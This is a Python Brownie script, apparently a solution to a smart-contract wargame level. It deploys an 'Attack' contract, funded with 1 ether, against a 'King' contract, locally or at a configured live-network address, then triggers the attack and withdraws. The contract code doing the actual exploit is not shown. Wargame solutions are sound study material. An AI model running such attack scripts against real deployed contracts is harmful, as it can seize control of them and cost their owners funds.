from brownie import Attack, King, network, config, Contract
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        king = King.deploy({"from": get_account(index=1)})

        attack = Attack.deploy(king, {"from": account, "value": Web3.toWei(1, "ether")})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        king = Contract.from_abi(
            King._name,
            config["networks"][network.show_active()]["king"],
            King.abi,
        )

        attack = Attack.deploy(king, {"from": account, "value": Web3.toWei(1, "ether")})

    attack.attack(Web3.toWei(1, "ether"), {"from": account, "gas_limit": 1000000}).wait(
        1
    )

    attack.withdraw({"from": account}).wait(1)

    print(f"Attack address is {attack}")
    print(f"New king address is {king._king()}")


def main():
    attack()
